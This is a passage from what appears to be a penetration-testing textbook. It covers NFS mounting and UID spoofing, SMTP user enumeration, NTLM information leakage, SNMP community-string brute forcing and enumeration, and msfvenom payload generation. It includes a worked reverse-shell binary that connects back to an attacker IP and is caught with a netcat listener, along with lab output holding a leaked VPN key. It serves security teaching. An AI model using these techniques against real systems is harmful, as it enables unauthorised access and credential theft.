|_  /site_backups  31119356.0  12262892.0  18856464.0  40%   16.0T        1023

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_mounting_shares">Mounting Shares</h4>
<div class="paragraph">
<p>To mount available shares we can use the <code>mount</code> binary, specifying NFS along with some other optional flags.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">mount -t nfs -o vers=2 &lt;IP&gt;</span>:&lt;SHARE NAME&gt; &lt;LOCAL MOUNT DIR&gt; <span class="nt">-o</span> nolock</code></pre>
</div>
</div>
<div class="ulist">
<ul>
<li>
<p><code>-o vers=2</code> requests that the server use NFS version 2. We should do this as it lacks authentication.</p>
</li>
<li>
<p><code>-o nolock</code> disables file locking, which is occasionally required for older NFS servers.</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Once we have mounted, we should check if we have write permissions on the share and if there are any sensitive files.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/tmp#</span><span class="w"> </span><span class="nb">mkdir </span>tmpmount
<span class="gp">root@Guest:/tmp#</span><span class="w"> </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>2 10.10.10.180:/site_backups tmpmount <span class="nt">-o</span> nolock
<span class="gp">root@Guest:/tmp#</span><span class="w"> </span><span class="nb">ls </span>tmpmount
<span class="go">App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
</span><span class="gp">root@Guest:/tmp#</span><span class="w"> </span><span class="nb">touch</span> ./tmpmount/test
<span class="go">touch: cannot touch './tmpmount/test': Read-only file system
</span><span class="gp">root@Guest:/tmp#</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_uid_gid_spoofing">UID &amp; GID Spoofing</h4>
<div class="paragraph">
<p>NFS before version 4 implicitly trusted client machines to authenticate users and assign the same UIDs as used by the file system.</p>
</div>
<div class="paragraph">
<p>This means that if we are able to mount an NFS share from an attacking machine that has sensitive files unavailable to us (i.e. only readable by another UID), we can simply create a user locally with the same UID or GID. This can be trivially accomplished by editing <code>/etc/passwd</code>.</p>
</div>
<div class="paragraph">
<p>Tools exist to automate this spoofing, such as <code>NfSpy</code> (<a href="https://github.com/bonsaiviking/NfSpy" class="bare">https://github.com/bonsaiviking/NfSpy</a>), which also supports other handy features like immediately unmounting after mounting shares (but keeping the file handles) to hide from other users running <code>showmount</code>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_simple_mail_transfer_protocol">Simple Mail Transfer Protocol</h3>
<div class="paragraph">
<p>Simple Mail Transfer Protocol (SMTP) is a plaintext protocol used for sending and receiving e-mail. In practice, it is mostly used to send e-mails and other mail protocols (IMAP, POP3) handle retrieval.</p>
</div>
<div class="paragraph">
<p>SMTP historically listened on TCP 25 by default, but TCP 587 and 2525 are more common nowadays.</p>
</div>
<div class="sect3">
<h4 id="_username_enumeration">Username Enumeration</h4>
<div class="paragraph">
<p>SMTP supports several commands that assist us in username enumeration for the box.</p>
</div>
<div class="paragraph">
<p>First we connect to the listening SMTP server. As it is a plaintext protocol, we can use <code>nc</code>, <code>telnet</code> or other similar tools.</p>
</div>
<div class="paragraph">
<p>First, we identify ourselves under a nonsense domain address.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>telnet 10.10.10.51 25
<span class="go">Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 24 Mar 2021 09:34:55 -0400 (EDT)
HELO A
250 solidstate Hello A (10.10.14.12 [10.10.14.12])</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>From here, we can take advantage of the <code>VRFY</code> command to verify the existence of a username.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">VRFY root
</span><span class="gp">250 Super-User &lt;root@mailserver&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Hardened servers will usually have this command disabled.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">VRFY nonexistent
502 5.3.3 VRFY is not supported</span></code></pre>
</div>
</div>
<div class="paragraph">
<p><code>EXPN</code> is a similar command that requests the membership of a mailing list (where a mailing list can often mean a user on the host). Often disabled, as its usecase is obselete on modern mail servers.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">EXPN root
</span><span class="gp">250 2.1.5 &lt;real.name@mailserver&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Another way of enumerating users is through the <code>RCPT TO</code> field of an email.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>telnet 10.10.10.197 25
<span class="go">Trying 10.10.10.197...
Connected to 10.10.10.197.
Escape character is '^]'.
220 debian ESMTP Postfix (Debian/GNU)
HELO X
250-debian
MAIL FROM:not@real.com
250 2.1.0 Ok
RCPT TO:notreal
</span><span class="gp">550 5.1.1 &lt;notreal&gt;</span>: Recipient address rejected: User unknown <span class="k">in </span><span class="nb">local </span>recipient table
<span class="go">RCPT TO:root
250 2.1.5 Ok</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_ntlm_response_information_leakage">NTLM Response Information Leakage</h4>
<div class="paragraph">
<p>NT Lan Manager (NTLM) is a suite of authentication protocols in Windows networks (like Active Directory). Many protocols also support NTLM authentication to allow users already logged into a domain to access services like e-mail and databases without having to reenter credentials.</p>
</div>
<div class="paragraph">
<p>Some SMTP servers may have NTLM authentication enabled. If we send an SMTP NTLM authentication request with empty credentials, the remote service will respond with a base64 encoded NTLMSSP message that discloses its NetBIOS name, DNS name and the install of Windows, among other things.<a href="#smtpntlm">[1]</a></p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">&gt;</span><span class="o">&gt;</span> AUTH NTLM 334
<span class="go">NTLM supported
</span><span class="gp">&gt;</span><span class="o">&gt;</span> <span class="nv">TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA</span><span class="o">=</span>
<span class="go">334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can use the <code>ntlm_challenger</code> (<a href="https://github.com/b17zr/ntlm_challenger" class="bare">https://github.com/b17zr/ntlm_challenger</a>) python script to decode the NTLMSSP response by making use of its parse_challenge function.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="n">root</span><span class="o">@</span><span class="n">Guest</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">ntlm_challenger</span><span class="c1"># python3
</span><span class="n">Python</span> <span class="mf">3.9</span><span class="p">.</span><span class="mi">1</span><span class="o">+</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Jan</span> <span class="mi">20</span> <span class="mi">2021</span><span class="p">,</span> <span class="mi">14</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">22</span><span class="p">)</span>
<span class="p">[</span><span class="n">GCC</span> <span class="mf">10.2</span><span class="p">.</span><span class="mi">1</span> <span class="mi">20210110</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">ntlm_challenger</span> <span class="kn">import</span> <span class="o">*</span>
<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">response</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">"TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA"</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">print_challenge</span><span class="p">(</span><span class="n">parse_challenge</span><span class="p">(</span><span class="n">response</span><span class="p">))</span>

<span class="n">Target</span> <span class="p">(</span><span class="n">Server</span><span class="p">):</span> <span class="n">IIS01</span>

<span class="n">Version</span><span class="p">:</span> <span class="n">Server</span> <span class="mi">2012</span> <span class="n">R2</span> <span class="o">/</span> <span class="n">Windows</span> <span class="mf">8.1</span> <span class="p">(</span><span class="n">build</span> <span class="mi">9600</span><span class="p">)</span>

<span class="n">TargetInfo</span><span class="p">:</span>
  <span class="n">MsvAvNbDomainName</span><span class="p">:</span> <span class="n">IIS01</span>
  <span class="n">MsvAvNbComputerName</span><span class="p">:</span> <span class="n">IIS01</span>
  <span class="n">MsvAvDnsDomainName</span><span class="p">:</span> <span class="n">IIS01</span>
  <span class="n">MsvAvDnsComputerName</span><span class="p">:</span> <span class="n">IIS01</span>
  <span class="n">MsvAvTimestamp</span><span class="p">:</span> <span class="n">Mar</span> <span class="mi">04</span><span class="p">,</span> <span class="mi">2020</span> <span class="mi">18</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mf">28.046826</span>

<span class="n">Negotiate</span> <span class="n">Flags</span><span class="p">:</span>
  <span class="n">NTLMSSP_NEGOTIATE_UNICODE</span>
  <span class="n">NTLMSSP_REQUEST_TARGET</span>
  <span class="n">NTLMSSP_NEGOTIATE_ALWAYS_SIGN</span>
  <span class="n">NTLMSSP_TARGET_TYPE_SERVER</span>
  <span class="n">NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY</span>
  <span class="n">NTLMSSP_NEGOTIATE_TARGET_INFO</span>
  <span class="n">NTLMSSP_NEGOTIATE_VERSION</span>
<span class="o">&gt;&gt;&gt;</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_nse_scripts_3">NSE Scripts</h4>
<div class="paragraph">
<p>Nmap supports the <code>smtp-enum-users</code> script to automate the above methods of username enumeration. It also sports the <code>smtp-ntlm-info</code> script for collecting leaked information in an NTLMSSP authentication response.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_internet_message_access_protocol_imap_post_office_protocol_3_pop3">Internet Message Access Protocol (IMAP) &amp; Post Office Protocol 3 (POP3)</h3>
<div class="paragraph">
<p>As the name suggests, IMAP enables the access of "internet messages" (emails) stored on a server. Often used in conjuction with SMTP.</p>
</div>
<div class="paragraph">
<p>By default, IMAP listens on TCP 143 and often on TCP 993 for SSL/TLS support.</p>
</div>
<div class="paragraph">
<p>POP3 differs to IMAP in that the protocol requires the downloading of the server side mail to a local client before reading (the mail is then deleted server side). While this allows for an "offline" mail client of sorts, where you only need to fetch new mail periodically, it also prohibits the use of multiple mail clients.</p>
</div>
<div class="paragraph">
<p>IMAP is the more modern protocol and sees more use today.</p>
</div>
<div class="paragraph">
<p>Don&#8217;t forget to check these mail servers with common and looted credentials; internal mail correspondence may expose sensitive information.</p>
</div>
<div class="sect3">
<h4 id="_ntlm_response_information_leakage_2">NTLM Response Information Leakage</h4>
<div class="paragraph">
<p>Both IMAP and POP3 support integration with NTLM authentication, meaning we can interrogate the NTLMSSP response to retrieve machine information, similar to how it was done for SMTP.</p>
</div>
<div class="paragraph">
<p>We can take advantage of the <code>imap-ntlm-info</code> and <code>pop3-ntlm-info</code> NSE scripts to automate this task for us.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_simple_network_management_protocol_snmp">Simple Network Management Protocol (SNMP)</h3>
<div class="paragraph">
<p>SNMP is a protocol used to monitor devices in a network and modify their settings (represented as nodes in a tree). The protocol interacts with Management Information Bases (MIBs), which are a databases of information for managing network devices.</p>
</div>
<div class="paragraph">
<p>These MIBs consist of Object Identifiers (OIDs) - a sequence of period separated numbers which we can think of as representing nodes down a tree. They refer either to a device, or its characteristics. The first few parts of an OID are often the same (as they represent that the OID refers to a private enterprise identifier along with some historical book keeping): <code>1.3.6.1.4.1</code>.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<a class="image" href="https://docs.oracle.com/cd/E18752_01/html/817-3000/figures/ISOnamespace.png"><img src="Images/snmpoid.png" alt="snmpoid"></a>
</div>
<div class="title">Figure 2. Example of OID <a href="#2">[2]</a></div>
</div>
<div class="paragraph">
<p>SNMP listens on UDP 161 by default.</p>
</div>
<div class="sect3">
<h4 id="_community_strings">Community Strings</h4>
<div class="paragraph">
<p>SNMP before version 3 (versions before 3 are still frequently used) base their authentication off of a string - the community string - which effectively acts as a password. There are two types of community strings: the public string, required for read access, and the private string, usually used for both read and write.</p>
</div>
</div>
<div class="sect3">
<h4 id="_onesixtyone">onesixtyone</h4>
<div class="paragraph">
<p><code>onesixtyone</code> is a tool to scan and bruteforce community strings for SNMP servers. By default, it tries the community strings <code>public</code> and <code>private</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">onesixtyone  [-c &lt;FILE WITH COMMUNITY STRINGS TO TRY&gt;</span><span class="o">]</span> &lt;IP&gt; <span class="o">[</span><span class="nt">-o</span> &lt;OUTPUT LOG&gt;]</code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>onesixtyone 10.10.10.116
<span class="go">Scanning 1 hosts, 2 communities
10.10.10.116 [public] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can specify a list of hosts to try with <code>-i &lt;FILE WITH HOST IPs&gt;</code>.</p>
</div>
</div>
<div class="sect3">
<h4 id="_snmpwalk">snmpwalk</h4>
<div class="paragraph">
<p>Once we&#8217;ve identified a list of SNMP servers and appropriate community strings, we can start to enumerate the MIBs with a tool such as <code>snmpwalk</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">snmpwalk -c &lt;COMMUNITY STRING&gt;</span><span class="w"> </span><span class="nt">-v</span> &lt;VERSION&gt; &lt;IP&gt; <span class="o">[</span>OID]</code></pre>
</div>
</div>
<div class="paragraph">
<p>We specify the community string to use, the version (e.g. <code>-v 2c</code>) and the host. We can also optionally specify an OID to query.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 2c 10.10.10.116
<span class="go">iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (80291) 0:13:22.91
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
</span><span class="c">...</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can specify certain well known OIDs to get specific information:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>OID</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>1.3.6.1.4.1.77.1.2.25</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Windows Users</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>1.3.6.1.2.1.25.4.2.1.2</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Windows Processes</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>1.3.6.1.2.1.6.13.1.3</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Open TCP Ports</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>1.3.6.1.2.1.25.6.3.1.2</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Installed Software</p></td>
</tr>
</tbody>
</table>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 2c 10.10.10.116 1.3.6.1.4.1.77.1.2.25
<span class="go">iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.9.68.101.115.116.105.116.117.116.101 = STRING: "Destitute"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_snmp_check">snmp-check</h4>
<div class="paragraph">
<p><code>snmp-check</code> (<a href="http://www.nothink.org/codes/snmpcheck/" class="bare">http://www.nothink.org/codes/snmpcheck/</a>) is a Perl script designed to enumerate MIBs with human readable output (accomplished by painstakingly labelling many OIDs). Very helpful alternative to cross-referencing a huge number of OIDs.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/opt/ntlm_challenger#</span><span class="w"> </span>snmp-check 10.10.10.116 <span class="nt">-c</span> public <span class="nt">-v</span> 2c
<span class="go">snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.116:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 10.10.10.116
  Hostname                      : Conceal
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
  Location                      : -
  Uptime snmp                   : 00:25:36.01
  Uptime system                 : 00:25:18.42
  System date                   : 2021-3-25 01:27:06.2
  Domain                        : WORKGROUP

[*] User accounts:

  Guest
  Destitute
  Administrator
  DefaultAccount

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 12
</span><span class="c">...
</span></code></pre>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_putting_it_together_investigating_services">Putting it Together: Investigating Services</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO:</p>
</div>
</div>
</div>
<h1 id="_exploitation" class="sect0">Exploitation</h1>
<div class="openblock partintro">
<div class="content">
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Here comes the fun stuff.</p>
</div>
</blockquote>
<div class="attribution">
&#8212; Andrew Yu
</div>
</div>
<div class="paragraph">
<p>Exploitation is the art of finding paths of control flow never intended by the developers. Its keystone is <strong>unexpected behaviour</strong> - software engineers learn to fear the segfault, we relish it.</p>
</div>
<div class="paragraph">
<p>In the context of an engagement, the exploitation phase is where we get our foothold onto a machine or the network, usually by compromising one or more services to grant us Remote Code Execution (RCE).</p>
</div>
<div class="paragraph">
<p>By now, we should have a fairly accurate map of the attack surface exposed to us by the network - software &amp; services, version info, usernames, configurations and OS information among other things.</p>
</div>
<div class="paragraph">
<p>This map will guide us to the treasure - exploitable vulnerabilities.</p>
</div>
<div class="paragraph">
<p>As a general guideline, the following progression can be followed when looking for a foothold onto a machine:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Check if we have any credentials (e.g. looted from an insecure NFS share, reused credentials, compromised users from another machine) that can be used to immediately gain access to the machine. For example, we could simply login to an SSH server, or an administrative web interface from where we could escalate to an interactive shell.</p>
</li>
<li>
<p>Examine public exploit repositories and CVE releases to see if any of the discovered services have vulnerabilities with weaponised (or weaponisable) exploits.</p>
</li>
<li>
<p>Probe and fuzz proprietary solutions such as custom web apps or unidentifiable services. Audit source code if available (whether provided by the client or looted).</p>
</li>
<li>
<p>Check if lateral access from another machine increases the attack surface - for example, by attacking an otherwise hidden service or modifying shared files to exploit clientside vulnerabilities.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Before we get stuck in, lets do a little housekeeping.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_msfvenom">msfvenom</h2>
<div class="sectionbody">
<div class="paragraph">
<p><code>msfvenom</code> is a standalone tool that is part of the Metasploit Project (a very helpful framework designed to manage and automate certain aspects of a penetration test) used to generate and encode exploit payloads. It ships with many encoders &amp; payload types for multiple formats and all major operating systems &amp; architectures.</p>
</div>
<div class="paragraph">
<p><code>msfvenom</code> is invaluable piece of tooling for our workflow, allowing us to create reverse shells, shellcode for custom exploits, one liner payloads and much more.</p>
</div>
<div class="paragraph">
<p>The basic usage is specified below:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">msfvenom [-a &lt;ARCHITECTURE&gt;</span><span class="o">]</span> <span class="o">[</span><span class="nt">--platform</span> &lt;PLATFORM&gt;] <span class="nt">-p</span> &lt;PAYLOAD&gt; <span class="o">[</span><span class="nt">-e</span> &lt;ENCODER&gt;] <span class="o">[</span><span class="nt">-b</span> &lt;BAD BYTES&gt;] <span class="o">[</span><span class="nt">-f</span> &lt;FORMAT&gt;]  <span class="o">[</span><span class="nt">-o</span> &lt;FILE&gt;] &lt;PAYLOAD SPECIFIY OPTIONS&gt;</code></pre>
</div>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Switch</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-a &lt;ARCHITECTURE&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify which architecture the payload should target. This will vary for the platform. Usually, we are concerned with whether the payload should be 32 or 64 bit (x86/x64) for Unix / Windows systems. This may be implicitly specified in the payload.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--platform &lt;PLATFORM&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify which platform the payload should target. There are over 25 platforms supported, from Windows to Cisco to Python. This may be implicitly specified in the payload.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-p &lt;PAYLOAD&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify the actual payload. The payload will be a path of sorts, such as <code>windows/shell_reverse_tcp</code>.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--list &lt;TYPE&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">List the modules available for a type of option. For example, to list all payloads, <code>--list payloads</code>.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-e &lt;ENCODER&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify an encoder to encode the payload with. This is primarily to avoid the presence of bad bytes in the payload, with a secondary benefit of tripping up poor anti virus or packet inspection solutions.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-b &lt;BAD BYTES&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>msfvenom</code> will make a best effort attempt at generating a payload without these specified bad bytes. The most common bad byte is the null byte - <code>\x00</code> - since it often signals the end of a string. This option is mostly relevant during exploit development for generating shellcode (e.g. for a buffer overflow payload).</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-f &lt;FORMAT&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify what format <code>msfvenom</code> should output the payload in. For example, we could specify <code>python</code> to have the output be segmented into a multiline python string, or <code>raw</code> to have the raw bytes of a binary output.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-o &lt;FILE&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">The file which <code>msfvenom</code> should write the output to.</p></td>
</tr>
</tbody>
</table>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>When specifying an encoder or bad bytes (which implicitly invokes the encoding behaviour), note that some encoders push and pop from the stack when decoding the payload. Depending on the position of the shellcode, this could mangle our payload. An easy fix is having a small NOP sled before our exploit (which we should have anyway).</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>After the switches come the payload specific options. Most commonly, these will be our targeting options for a reverse shell. <code>LHOST</code> and <code>LPORT</code> will specify the host and port to connect back to (usually the attacking machine and the port we have a handler like netcat listening on) for a reverse shell.</p>
</div>
<div class="paragraph">
<p>We can list all options for a payload by specifying it and invoking <code>--list-options</code>. This also lists a small module description.</p>
</div>
<div class="paragraph">
<p>For example, if we wanted to create a reverse shell binary to drop onto a 64 bit Linux system, we would invoke the following:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=&lt;ATTACKING IP&gt;</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;LISTENING PORT&gt; <span class="nt">-f</span> elf <span class="nt">-o</span> reverse</code></pre>
</div>
</div>
<div class="paragraph">
<p>If we spin up a netcat handler on a port, we can catch our shell.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/tmp#</span><span class="w"> </span>nc <span class="nt">-nvlp</span> 6990
<span class="go">Listening on 0.0.0.0 6990</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:/tmp#</span><span class="w"> </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.1.116 <span class="nv">LPORT</span><span class="o">=</span>6990 <span class="nt">-f</span> elf <span class="nt">-o</span> reverse
<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: reverse

</span><span class="gp">root@Guest:/tmp#</span><span class="w"> </span><span class="nb">chmod</span> +x reverse
<span class="gp">root@Guest:/tmp#</span><span class="w"> </span>./reverse</code></pre>
</div>
</div>
<div class="paragraph">
<p>Back on our listener, we catch our reverse shell.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">Connection received on 192.168.1.116 38870
whoami
root</span></code></pre>
</div>
</div>
<div class="sect2">
<h3 id="_staged_meterpreter_shells">Staged &amp; Meterpreter Shells</h3>
<div class="paragraph">
<p><code>msfvenom</code> supports the creation of "staged payloads". These generated payloads do not execute the functionality of the payload as described, but instead connects back to a special listener to download the full payload. This greatly cuts down on the file size of the payload (which is helpful for byte limited exploits, such as a small working space in a buffer overflow) but, as mentioned, requires a special handler to catch.</p>
</div>
<div class="paragraph">
<p>Non staged payloads are self contained and can be caught with non metasploit handlers (e.g. netcat), while staged payloads require specific handlers (usually the ones from Metasploit&#8217;s <code>exploit/multi/handler</code> module) to deliver the rest of the payload.</p>
</div>
<div class="paragraph">
<p>Staged exploits can be identified by their description (e.g. when invoking <code>--list</code> or <code>--list-options</code>) and the usage of the forward slash as a separator instead of an underscore between the payload name in the path and "shell".</p>
</div>
<div class="paragraph">
<p>i.e. <code>windows/shell/reverse_tcp</code> refers to the staged variant of the <code>windows/shell_reverse_tcp</code> payload.</p>
</div>
<div class="paragraph">
<p>Otherwise, they share their path/name with their stageless equivalent.</p>
</div>
<div class="paragraph">
<p>TODO: Quick writeup on meterpreter &#8230;&#8203;</p>
</div>
<div class="paragraph">
<p>Covering the entire Metasploit framework is out of the scope of this book.</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_shells">Shells</h2>
<div class="sectionbody">
<div class="paragraph">
